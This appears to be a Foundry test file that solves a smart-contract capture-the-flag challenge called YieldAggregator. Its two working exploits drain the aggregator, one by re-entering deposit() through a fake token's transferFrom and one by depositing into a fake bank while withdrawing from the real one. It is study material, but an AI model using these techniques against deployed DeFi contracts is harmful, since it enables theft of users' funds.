// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.0;

import "forge-std/Test.sol";
import "../../src/08.YieldAggregator/Setup.sol";
import "./interface.sol";

contract attackTest is Test {
    string constant weth9_Artifact = 'out/tools/helper_WETH9.sol/WETH9.json';

    Setup public level;
    IWETH9 public weth;
    Protocol public protocol; // bank
    YieldAggregator public aggregator;

    function setUp() public {
        // 我们用 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4 进行部署
        payable(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4).transfer(100 ether);
        vm.startBroadcast(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4);

        // 部署WETH
        weth = IWETH9(deployHelper_weth(weth9_Artifact));
        vm.label(address(weth), "weth");

        level = new Setup{value: 100 ether}(address(weth));
        aggregator = level.aggregator();
        protocol = Protocol(address(level.bank()));

        vm.stopBroadcast();
    }

    function test_isComplete_solution01() public{

        // 先存50进去
        weth.deposit{value: 50 ether}();
        // 做一些授权准备
        weth.approve(address(aggregator), type(uint256).max);
        weth.approve(address(protocol), type(uint256).max);

        // 开始攻击
        address[] memory _tokens = new address[](1);
        _tokens[0] = address(this); // token是本合约，在transferFrom()的时候会重入deposit()
        uint256[] memory _amounts = new uint256[](1);
        _amounts[0] = 100;
        // deposit会重入攻击
        aggregator.deposit(protocol, _tokens, _amounts);

        // 正常取钱
        _tokens[0] = address(weth);
        _amounts[0] = 100 ether;
        aggregator.withdraw(protocol, _tokens, _amounts);

        // 检查是否完成题目
        assertEq(level.isSolved(), true);
    }

    function test_isComplete_solution02() public{

        // 先存50进去
        weth.deposit{value: 50 ether}();

        // 新建一个假的bank
        MiniBank fakeBank = new MiniBank(address(weth));
        // 做一些授权准备
        weth.approve(address(aggregator), type(uint256).max);
        weth.approve(address(protocol), type(uint256).max);
        weth.approve(address(fakeBank), type(uint256).max);

        // 在假的bank中进行存储，但是快照一样会进行拍照
        address[] memory _tokens = new address[](1);
        _tokens[0] = address(weth);
        uint256[] memory _amounts = new uint256[](1);
        _amounts[0] = 50 ether;
        aggregator.deposit(Protocol(address(fakeBank)), _tokens, _amounts);

        // 取款的时候，是在真的bank中取款，因为我们在快照中有余额，因此可以取款成功
        aggregator.withdraw(protocol, _tokens, _amounts);

        // 检查是否完成题目
        assertEq(level.isSolved(), true);
    }

    function approve( address dst, uint256 qty) external returns (bool) {
        return true;
    }

    // 不是正常的转账逻辑，而是重入deposit()
    function transferFrom( address src, address dst, uint256 qty) external returns (bool) {
        address[] memory _tokens = new address[](1);
        _tokens[0] = address(weth);

        uint256[] memory _amounts = new uint256[](1);
        _amounts[0] = 50 ether;
        aggregator.deposit(protocol, _tokens, _amounts);
        return true;
    }

    // 部署WETH
    function deployHelper_weth(string memory what) public returns (address addr) {
        bytes memory bytecode = vm.getCode(what);
        assembly {
            addr := create(0, add(bytecode, 0x20), mload(bytecode))
        }
    }
}
